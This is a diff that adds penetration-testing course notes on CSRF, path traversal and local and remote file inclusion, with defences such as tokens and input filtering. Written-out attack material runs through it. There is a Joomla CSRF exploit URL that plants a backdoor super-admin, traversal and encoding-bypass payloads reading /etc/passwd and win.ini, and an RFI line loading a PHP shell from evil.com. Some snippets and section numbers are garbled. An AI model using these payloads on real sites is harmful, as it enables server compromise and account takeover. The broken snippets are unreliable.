@@ -257,7 +257,300 @@ Let's take a look at them.
 (see vid-54)
 ____________________________________________________
 ## 5.3. CSRF
+**CSRF** or **XSRF** attacks (also pronounced Sea-Surf attacks) are something that every web app tester should know about and master. This is because automated scanning tools cannot easily find these vulnerabilities.
+CSRF exploits a feature of internet browsing, instead of a specific vulnerability.
 
+CSRF is a vulnerability where a third-party web application is able to perform an action on the user's behalf.
+It is behalf on the fact that web applications can send requests to other web applications, without showing the response.
+Let us have a look at a typical example.
+
+Example (see img-59):
+  1. Bob (victim) visits `amazon.com`, logs in, then leaves the site without logging out
+  2. Bob then visits `foo.com` (malicious website) which inadvertently executes a request to `amazon.com` (`<img src="http://www.amazon.com/buy/123">`) from the Bob's browser (such as buy a book)
+  3. The victim browser send this request, along with all the victim cookies. The request seems legit to `amazon.com`
+
+Since Bob is still logged in on Amazon, the request goes through and the money is withdrawn from his account for the purchase of the book.
+
+How can `foo.com` issue a request to Amazon on behalf of Bob?
+
+  Whatever is in a webpage, Bob's browser parses it and requests it: if an image with the URL `amazon.com/buy/123` is present in the page, the web browser will silently issue a request to `amazon.com`, thus buying the book.
+
+  This is because Bob already has an authenticated session open on Amazon.
+
+It sounds simple, because it really is.
+Google, Amazon, eBay, and other major websites used to be vulnerable to CSRF but a large number of smaller websites and third party application scripts still remain vulnerable.
+
+#### 5.3.1. Finding CSRF
+All request to a web application that do not implement an anti-CSRF mechanism are automatically vulnerable.
+This may sound trivial but CSRF is really that common:
+- http://thehackernews.com/2014/08/flickr-cross-site-request-forgery.html
+- http://web.archive.org/web/20150418174949/http:/breakingbits.net/2015/01/18/taking-over-godaddy-accounts-using-csrf/
+- http://www.ehackingnews.com/2012/10/hacker-news-csrf-vulnerability-in-Twitter.html
+
+When a web application stores session information in cookies, these cookies are sent with every request to that web application (same-origin policy applies).
+
+This may sound odd but, storing session tokens in cookies enables CSRF exploitability (while, of course storing session tokens into URLs enable other kind of exploits)
+
+Token and Captchas are the most commonly used protection mechanisms.
+We will study them in more detail one the CSRF exploitation process is clear.
+
+#### 5.3.2. Exploiting CSRF
+Lets take a look at a real world example. It is old but it will help us to understand how CSRF works:
+  *In 2005, we considered using Joomba as a CMS for Hacker's Center, and retiring our old, hand-coded ASP-based CMS*
+
+The first thing we realized when we took it for a drive was the presence of multiple CSRF vulnerabilities.
+
+The worst of them allowed us to have super administrator access. When the admin had an open session on his Joomla backend, we were able to upload arbitrary files, post articles or even deface his own website.
+
+If only we could manage to force him into visiting a web page containing the exploit payload.
+
+What we will see now is how we built a payload to have the Super Admin create another super admin in order to grant us persistent backdoor access to the website.
+  The main difference between this and other vulnerabilities is that this exploit does not require "malicious" payload data.
+
+  In the next slide, we will go through the process of building a working exploit for the Joomla vulnerability (affected version is 1.0.13)
+
+  This process will go through the steps required to build a working exploit against Joomla 1.0.13 and below 1.5rc3.
+
+  If you want to test this by yourself, you can download a copy of a vulnerable Joomla release from the [Joomla SVN](http://joomlacode.org/gf/project/joomla/scmsvn/?action=browse&path=/development/releases/1.0/) or [here](http://joomlacode.org/gf/project/joomla/frs/?action=FrsReleaseBrowse&frs_package_id=1)
+
+Steps:
+  First, we have to identify the structure of the request that will let us reach our objective (adding a super admin in our case).
+    There is obviously a CGI that takes some arguments through GET or POST.
+
+    The CGI creating a new Super Admin user in Joomla is `/administrator/index.php`. It takes arguments through the POST method.
+
+    Go to that form and use Burp to figure out all the parameters that the form send when adding a new test Super Administrator. (see img-72)
+
+    Since the request method is a POST, we have to use a proxy that will let us transform a GET request into a POST request.
+
+    To achieve this we can use Chris Shifflet's PHP [proxy](http://shiflett.org/blog/2007/jul/csrf-redirector). This is a simple, but effective source code used by Chris to achieve the transformation GET -> POST:
+      ```
+      <iframe style="width" 0px; height: 0px, visibility: hidden" name "hidden"></iframe>
+      </form>
+      <script>document.csrf.submit();</script>
+      ```
+
+      The script takes a URL as input with additional parameters.
+      These parameters will be sent to it as a GET.
+  The script will make sure to build a POST request to the CGI attaching these parameters.
+    ```
+    http://sifflet.org/csrf.php?csrf=[CGI]?[ARGUMENTS]
+    ```
+
+  Our CGI is nothing but:
+    ```
+    http:%3a%2Fvuln%2Fadministrator%2Findex%2Ephp
+    ```
+  The arguments found in the previous step are the parameters in querystring format:
+    ```
+    name=John&username=john&email=john%40does.com&passowrd=john&password2=john&gid=25&block=0&sendEmail=0&id=0&cid%5B%5D=0&option=com_users&task=apply&contact_id=
+    ```
+
+  So our final exploit URL is:
+    ```
+    http://sifflet.org/csrf.php?csrf=name=John&username=john&email=john%40does.com&passowrd=john&password2=john&gid=25&block=0&sendEmail=0&id=0&cid%5B%5D=0&option=com_users&task=apply&contact_id=
+    ```
+
+  (see vid-76)
+
+#### 5.3.3. Preventing CSRF
+This is a penetration tester course but, studying countermeasures and protection mechanisms often makes the exploitation explanation much cleaner.
+
+Also, do not forget that you were hired to provide solutions.
+
+The most common protection mechanism against CSRF exploit is the **token**.
+The token is a nonce (a number used to perform a given action unpredictable for an attacker) and makes part of the request required to perform a given action unpredictable for an attacker.
+
+In a real world scenario, the **Add-user** form in the administration area of CMS's include a hidden input that requires a token. This token can be implemented as an MD5 hash (or stronger) of some randomly-generated string.
+
+While rendering the form to the user, the following steps are taken by the web application to enforce protection against CSRF exploits:
+  1. Generate a token
+  2. Include the token as hidden input on the form
+  3. Save the token in the session variables
+
+The form will be submitted with the token:
+  ```
+  <form action="adduser.php" method="POST">
+  <input type="text" name="username"/>
+  ...
+  <input type="hidden" name="token" value="eb4f130331f9b0a25360975d7d565a76"/>
+  ...
+  </form>
+  ```
+  `adduser.php` will have to check that the token stored in the session matches the token received through the POST. If they match, the request is fulfilled, otherwise it is refused.
+
+###### 5.3.3.1. Why this works?
+An attacker able to force the victim to request the forged URL, has to provide a valid token.
+
+Two conditions may occur:
+- The victim has not visited the page and, as such, has no token set in session variables at all
+- The victim has visited the page and has a token
+
+In the second case, the attacker has to guess the correct token. That is generally considered impossible as long as token generation is truly random and the token is not easily predictable.
+It is crucial that the token must be random, unpredictable, and change for at least every session.
+
+**Note:**
+*The token becomes useless when the application is also vulnerable to XSS*
+
+Because of the same-origin policy, you cannot read the token set to `domain-vuln.com` from `domain-evil.com`.
+
+However, using a exploit on `domain-vulv.com`, the JavaScript meant to steal the token (and use it in a new request) will be executed on the legit domain (`domain-vuln.com`)
+
+The bottom line is this:
+  *To prevent CSRF, one has to implement a random token for every request and be immune to XSS exploits at the same time.*
 
 ____________________________________________________
 ## 4.4. File and Resource Attacks
+As you have already studied in the *Authentication and Authorization* module, **Authorization** is what you are able to do: authorization attacks have to do with accessing information that the user does not have permission to access.
+
+Although we explained some authorization bypass attacks in the previous module, here we are going to focus and dig deeper on attacks related to file and resources.
+
+#### 5.4.1. Path Traversal
+Some web application need to access resources on the file system to implement the web application (such as images, static text, and so on). They sometimes use parameters to define the resources.
+When these parameters are user-controlled, not properly sanitized, and are used to build resource path on the file system, security issues may arise.
+
+For example, let us consider a Web Application that allows a visitor to download a file by request the following URL : `http://www.elsfoo.com/getFile?path=FileA418fS5fds.pdf`
+
+The parameter **path** will be used by the web application to locate the resource named `FileA418fS5fds.pdf` on the file system.
+
+If the web application does not sanitize the parameter properly an attacker could manipulate it to access the contents of any arbitrary file (access resources that are note intended to be accessed).
+
+This attack, also known as the **dot-dot-slash** (**../**), is usually performed by means of those characters that allow us to move up in the directory tree.
+
+By prefacing the sequence **../** it may be possible to access directories that are hierarchically higher than the one from which we are picking the file.
+
+  For example, the following URL may be used to access the password file in UNIX systems:
+    ```
+    http://www.elsfoo.com/getFile?path=../../../etc/passwd
+    ```
+
+  Using relative path addressing, we are going up 3 levels from the current one to reach the root. The same may be achieved using **absolute path**:
+    ```
+    http://www.elsfoo.com/getFile?path=/etc/passwd
+    ```
+
+  On Windows systems, depending on the target OS version, you can try the following resources:
+    ```
+    http://www.elsfoo.com/getFile?path=../../../windows/win.ini
+    ```
+    ```
+    http://www.elsfoo.com/getFile?path=../../../boot.ini
+    ```
+
+Let's first analyze some useful information about how to build a path traversal payload and then see how we can protect our web applications against these attacks.
+- Path convention
+- Best defensive
+
+###### 5.4.1.1. Path Convention
+Depending on the OS running on the web server, a root folder can be located using the following syntax:
+- \*NIX: Slash (`/`)
+- Windows: <Drive Letter>: `\` (`C:\`)
+
+The following are the directory separator symbols to use depending on the OS:
+- \*NIX: Slash (`/`)
+- Windows: <Drive Letter>: Slash (`/`), Backslash (`\`)
+
+To move up the current directory you can use the following sequence: `../`
+A specific sequence can be used to terminate the current file name.
+This sequence takes the name of **NULL BYTE**: `%00`
+
+Note that `%00` does not work with PHP versions >= [5.3.4](http://svn.php.net/viewvc?view=revision&revision=305507).
+
+This can be useful to terminate the string in case something else is appended to it by the web application. An example in pseudo code:
+  ```
+  file_read("/htdocs/website/reports/" user_input + ".pdf");
+  ```
+  The `%00` would allow the user to terminate the string and read any other file extensions: `../../etc/passwd%00`.
+
+###### 5.4.1.2. Encoding
+Web applications that perform filtering operations on these nasty characters should be aware of different encodings. Let's see a few examples of URL encoding and double URL encoding:
+  |Character|URL encoding|16-bit Unicode|
+  |---------|------------|--------------|
+  | `.`     | %2e        | %u002e       |
+  | `/`     | %2f        | %u2215       |
+  | `\`     | %5c        | %u2216       |
+
+Any combination of the previous encoding may work on the target web application. So you may try something like the following payloads:
+  | `../`       | `..\`             |
+  |-------------|-------------------|
+  | `%2e%2e%2f` | `%2e%2e%5c`       |
+  | `%2e%2e/`   | `%2e%2e\`         |
+  | `..%2f`     | `..%5c`           |
+  | `..%255c`   | `%252e%252e%252c` |
+
+###### 5.4.1.3. Best Defensive Technique
+The simplest way to defend against a Path traversal attack is to filter any malicious sequences from the input parameters; below, you can see some typical sequences that should be filtered. In most cases, you will also want to filter the `/` char alone.
+- `../`
+- `..\`
+- `%00 (NULL BYTES)`
+
+#### 5.4.2. File Inclusion Vulnerabilities
+File inclusion vulnerabilities are divided into **Remote** and **Local**, depending on where the file to include is located.
+
+###### 5.4.2.1. Local File Inclusion
+Some of you may remember the *vintage* LFI (Local File Inclusion) attack against the first Perl CGIs in the early 90's:
+  ```
+  visit.pl?url=../../../../etc/passwd
+  ```
+
+This type of vulnerability was very common at the time, as a result of security awareness not being very widespread among developers.
+However, it is still found in custom scripts where path characters are not stripped from input and the input is used as part of an **include**.
+
+The vulnerability is easier to understand if we look at a simple section of PHP code. Let us suppose that the target application changes its content depending on the location of the visitor. The URL will be something like this:
+  ```
+  http://target.site/index.php?location=IT
+  ```
+and that the PHP code handles the parameter as follows:
+  ```
+  <?php
+    include("loc/" . $GET['location']);
+  ?>
+  ```
+
+As you can see we can just enter any valid local path-to-file to have the PHP include it in the response to our browser:
+  ```
+  index.php?location=../../../etc/passwd
+  ```
+
+This will go up 3 directories and then return `etc/passwd` which is the famous Unix password file.
+
+Let's see an example.
+  The target application hosted on `http://lfi.site` uses the `location` parameter to render the content to the user. (see img-105)
+    ```
+    http://lfi.site/index.php?location=US
+    ```
+    ```
+    http://lfi.site/index.php?location=IT
+    ```
+
+  In order to test if the application is vulnerable to LFI, we can use the following payload:
+    ```
+    http://lfi.site/index.php?location=../../../../../../etc/passwd
+    ```
+
+  if instead, the code looks like this:
+    ```
+    <?php
+      include($_GET['location'] . "/template.tlp")
+    ?>
+    ```
+
+  A valid exploit would be:
+    ```
+    index.php?location=../../../etc/passwd%00
+    ```
+  `%00` is the null character that terminates the string.
+
+  These vulnerabilities are usually found in little custom made CMS's where pages are loaded with an include and their paths taken from the input.
+
+###### 5.4.2.2. Remote File Inclusion
+**Remote File Inclusion** (RFI) works the same way as LFI; the only differences is that the file to be included is pulled remotely.
+
+Our aim in this case is not just to read but, to include our own code in the execution. An exploitable URL would look like this:
+  ```
+  vuln.php?page=http://evil.com/shell.txt
+  ```
+  In this case, `shell.txt` (containing PHP code), will be included in the page and executed.
+
+A common exploit to this vulnerability is to include a PHP shell that would let the hacker or the pentester execute any code on the server.
+Even the simplest PHP shell will accept commands from GET/POST arguments and execute them on the server.
